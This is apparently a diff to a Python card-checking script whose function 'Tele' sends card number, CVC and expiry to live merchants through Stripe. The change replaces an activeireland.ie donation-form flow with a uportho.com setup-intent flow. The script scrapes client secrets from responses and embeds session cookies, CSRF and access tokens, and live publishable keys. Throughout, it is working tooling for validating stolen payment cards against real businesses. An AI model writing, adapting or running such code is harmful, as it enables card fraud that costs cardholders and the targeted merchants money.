@@ -14,6 +14,57 @@ def Tele(ccx):
 	random2 = random.randint(1, 99)
 	random3 = random.randint(20, 999)
 	
+	cookies = {
+	    'frontend_lang': 'en_US',
+	    '_fbp': 'fb.1.1774627279794.126102955521407653',
+	    'seen_product_id_48293': '48293',
+	    'session_id': 'QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA',
+	    'tz': 'Asia/Bangkok',
+	}
+	
+	headers = {
+	    'authority': 'www.uportho.com',
+	    'accept': '*/*',
+	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+	    'content-type': 'application/json',
+	    # 'cookie': 'frontend_lang=en_US; _fbp=fb.1.1774627279794.126102955521407653; seen_product_id_48293=48293; session_id=QllPcnWh4gmK7SMvwKRCw5LvL4yiyhmNsvBOpgk1HlRpucAaku5R8RkPOZ2E0N99y4LNnfoJvRRudDrz1FoA; tz=Asia/Bangkok',
+	    'origin': 'https://www.uportho.com',
+	    'referer': 'https://www.uportho.com/my/payment_method',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'id': 1,
+	    'jsonrpc': '2.0',
+	    'method': 'call',
+	    'params': {
+	        'provider_id': 8,
+	        'payment_method_id': 77,
+	        'token_id': None,
+	        'amount': None,
+	        'flow': 'direct',
+	        'tokenization_requested': True,
+	        'landing_route': '/my/payment_method',
+	        'is_validation': True,
+	        'access_token': '916f567c8a985088e28412884ad8ae2e65264f9b085f0e36e986909e78c24c11',
+	        'csrf_token': '819aa8375ab7d268625fc104c17dbc6fa4194d4eo1806164850',
+	        'currency_id': None,
+	        'partner_id': 29079,
+	        'reference_prefix': 'V-20260327162730',
+	    },
+	}
+	
+	response = requests.post('https://www.uportho.com/payment/transaction', cookies=cookies, headers=headers, json=json_data)
+	
+	seti = re.search(r'"client_secret": "(.*?)_secret', response.text).group(1)
+	scrt = re.search(r'"client_secret": "(.*?)"', response.text).group(1)
+	
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -30,59 +81,10 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa000efd06a%3B+stripe-js-v3%2Fa000efd06a%3B+card-element&referrer=https%3A%2F%2Factiveireland.ie&time_on_page=112534&client_attribution_metadata[client_session_id]=790d4eb9-0ff5-49fe-9af2-4d6d8e811291&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Ox9BQRo8oFsGvVkjXGXBOye95AlMqSFgAQ3HhWyqpuSigu6lkna9msPE2qvskTM0mxKue40VVXxfxu3Wq6HU6yQ00Yj2ztFrL'
-	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
-	
-	cookies = {
-	    'g_state': '{"i_l":0,"i_ll":1774616752130,"i_b":"JXRA8nPSwYfn9gKDOrZrQsBx2kCNBR5felHTPMQuEYg","i_e":{"enable_itp_optimization":0}}',
-	    '_ga': 'GA1.1.636707816.1774616754',
-	    '_fbp': 'fb.1.1774616755373.870545280649172855',
-	    'widget_load_key': 'c13b09bb-3378-4d85-bfe9-93ec5960b7a1',
-	    'sib_cuid': '2621c935-6f4f-405f-995f-0c214c9670ae',
-	    'FCCDCF': '%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%229e2d7798-caae-4dd7-bf67-d9e1b83a5ae5%5C%22%2C%5B1774616756%2C680000000%5D%5D%22%5D%5D%5D',
-	    'FCNEC': '%5B%5B%22AKsRol88_oluFOK_wS8n9CloziWO1Xbyk4HCzPGXxPaoRMTI99IwTS9VmwKL9msv9nsXO-Ka6Dlf_Ogo27wyIRigTV1519M7tIdMWq3Uv7UxWi3lYJa83_qCyl9QRGtK6N6osKrgpnd6CKRrj2ROI50Mtyhg9CJWuA%3D%3D%22%5D%5D',
-	    '__stripe_mid': '8d6bb8f5-26dc-41d0-bcbf-38d357c058d2c33e86',
-	    '__stripe_sid': 'ddf977aa-cf51-4fb2-b93a-38b9efecc130363f3e',
-	    '_ga_EL7248BB7H': 'GS2.1.s1774616753$o1$g1$t1774616819$j60$l0$h1829158869',
-	    '_ga_D7K8ZN5SRL': 'GS2.1.s1774616754$o1$g1$t1774616865$j14$l0$h0',
-	    '_gcl_au': '1.1.155287006.1774616753.1083220885.1774616866.1774616865',
-	}
-	
-	headers = {
-	    'authority': 'activeireland.ie',
-	    'accept': '*/*',
-	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'g_state={"i_l":0,"i_ll":1774616752130,"i_b":"JXRA8nPSwYfn9gKDOrZrQsBx2kCNBR5felHTPMQuEYg","i_e":{"enable_itp_optimization":0}}; _ga=GA1.1.636707816.1774616754; _fbp=fb.1.1774616755373.870545280649172855; widget_load_key=c13b09bb-3378-4d85-bfe9-93ec5960b7a1; sib_cuid=2621c935-6f4f-405f-995f-0c214c9670ae; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%229e2d7798-caae-4dd7-bf67-d9e1b83a5ae5%5C%22%2C%5B1774616756%2C680000000%5D%5D%22%5D%5D%5D; FCNEC=%5B%5B%22AKsRol88_oluFOK_wS8n9CloziWO1Xbyk4HCzPGXxPaoRMTI99IwTS9VmwKL9msv9nsXO-Ka6Dlf_Ogo27wyIRigTV1519M7tIdMWq3Uv7UxWi3lYJa83_qCyl9QRGtK6N6osKrgpnd6CKRrj2ROI50Mtyhg9CJWuA%3D%3D%22%5D%5D; __stripe_mid=8d6bb8f5-26dc-41d0-bcbf-38d357c058d2c33e86; __stripe_sid=ddf977aa-cf51-4fb2-b93a-38b9efecc130363f3e; _ga_EL7248BB7H=GS2.1.s1774616753$o1$g1$t1774616819$j60$l0$h1829158869; _ga_D7K8ZN5SRL=GS2.1.s1774616754$o1$g1$t1774616865$j14$l0$h0; _gcl_au=1.1.155287006.1774616753.1083220885.1774616866.1774616865',
-	    'origin': 'https://activeireland.ie',
-	    'referer': 'https://activeireland.ie/active-summer-week-4-july-20th-july-24th-2026/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	params = {
-	    't': '1774616872921',
-	}
-	
-	data = {
-	    'data': f'__fluent_form_embded_post_id=17165&_fluentform_28_fluentformnonce=303fd51d06&_wp_http_referer=%2Factive-summer-week-4-july-20th-july-24th-2026%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random3}%40gmail.com&phone=%2B14303000850&dropdown_3=Facebook&input_radio=1&names_1%5Bfirst_name%5D=Yell&names_1%5Blast_name%5D=&dropdown=12&input_text=None&checkbox%5B%5D=No&input_radio_1=8&input_text_1=None&terms-n-condition_1=on&gdpr-agreement=on&custom-payment-amount=1&payment_method=stripe&terms-n-condition=&terms-n-condition_3=&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '28',
-	}
+	data = f'return_url=https%3A%2F%2Fwww.uportho.com%2Fpayment%2Fstripe%2Freturn%3Freference%3DV-20260327162730&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[billing_details][address][country]=TH&payment_method_data[payment_user_agent]=stripe.js%2Fa000efd06a%3B+stripe-js-v3%2Fa000efd06a%3B+payment-element%3B+deferred-intent&payment_method_data[referrer]=https%3A%2F%2Fwww.uportho.com&payment_method_data[time_on_page]=28167&payment_method_data[client_attribution_metadata][client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&payment_method_data[client_attribution_metadata][elements_session_id]=elements_session_1nvi50wd02N&payment_method_data[client_attribution_metadata][elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&client_context[currency]=ron&client_context[mode]=setup&client_context[capture_method]=automatic&client_context[payment_method_types][0]=card&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_bCePCGuVZkEyVHkk8jeLoT8400l0kjsuBU&_stripe_version=2019-05-16&client_attribution_metadata[client_session_id]=14ffa800-aae5-4058-a0e0-b69dc9d000e9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1nvi50wd02N&client_attribution_metadata[elements_session_config_id]=6c6a9383-4a43-4c08-9295-9ee9b0b90f70&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={scrt}'
 	
 	response = requests.post(
-	    'https://activeireland.ie/wp-admin/admin-ajax.php',
-	    params=params,
-	    #cookies=cookies,
+	    f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
 	    headers=headers,
 	    data=data,
 	)
